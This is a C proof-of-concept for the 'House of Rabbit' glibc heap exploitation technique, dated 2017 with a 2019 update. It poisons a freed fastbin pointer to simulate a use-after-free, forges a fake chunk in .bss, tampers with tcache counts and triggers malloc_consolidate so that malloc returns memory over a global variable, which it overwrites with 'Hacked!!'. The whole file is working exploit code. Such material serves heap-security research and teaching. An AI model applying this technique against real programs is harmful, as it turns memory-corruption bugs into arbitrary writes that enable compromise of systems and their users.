/*
   PoC of House of Rabbit
   Tested in Ubuntu 14.04, 16.04 (64bit).
   Yutaro Shimizu
   @shift_crops
   2017/09/14
   Update (2019/08/06) : Ubuntu 18.04 (glibc-2.27)
*/
// gcc house_of_rabbit.c -D GLIBC_VERSION=27 -o house_of_rabbit
#define GLIBC_VERSION 29
#include <stdlib.h>
#include <string.h>
#include <assert.h>
void evict_tcache(size_t size);
char target[0x30] = "Hello, World!";
unsigned long gbuf[8] = { 0 };
int main(void)
{
    void *p, *fast, *small, *fake;
    char *victim;
    // 0. Disable tcache for 0x20,0x90 chunks
    evict_tcache(0x18);
    evict_tcache(0x88);
    // 1. Make 'av->system_mem > 0xa00000'
    p = malloc(0xa00000);
    free(p);
    p = malloc(0xa00000);
    free(p);
    // 2. Free fast chunk and link to fastbins
    fast = malloc(0x18);
    small = malloc(0x88);
    free(fast);
    // 3. Make fake_chunk on .bss
    gbuf[0] = 0xfffffffffffffff0;
    gbuf[1] = 0x10;
    gbuf[3] = 0x21;
    gbuf[7] = 0x1;
    // VULNERABILITY
    // use after free or fastbins dup etc...
    fake = &gbuf[2];
    *(unsigned long **)fast = fake;
    // 4. call malloc_consolidate
    free(small);
    // 5. Link unsorted bins to appropriate list
    gbuf[3] = 0xa00001;
    malloc(0xa00000);
    gbuf[3] = 0xfffffffffffffff1;
    // 6. Overwrite targer variable
    malloc((void *)&target - (void *)(gbuf + 2) - 0x20);
    victim = malloc(0x10);
    strcpy(victim, "Hacked!!");
    assert(strcmp(target, "Hacked!!") == 0);
}
void evict_tcache(size_t size)
{
    void *p;
#if defined(GLIBC_VERSION) && (GLIBC_VERSION >= 26)
    p = malloc(size);
#if	(GLIBC_VERSION < 29)
    free(p);
    free(p);
    malloc(size);
    malloc(size);
    *(void **)p = NULL;
    malloc(size);
#else
#if (GLIBC_VERSION == 29)
    char *counts = (char *)(((unsigned long)p & ~0xfff) + 0x10);
#else
    uint16_t *counts = (char *)(((unsigned long)p & ~0xfff) + 0x10);
#endif
    counts[(size + 0x10 >> 4) - 2] = 0xff;
#endif
#endif
}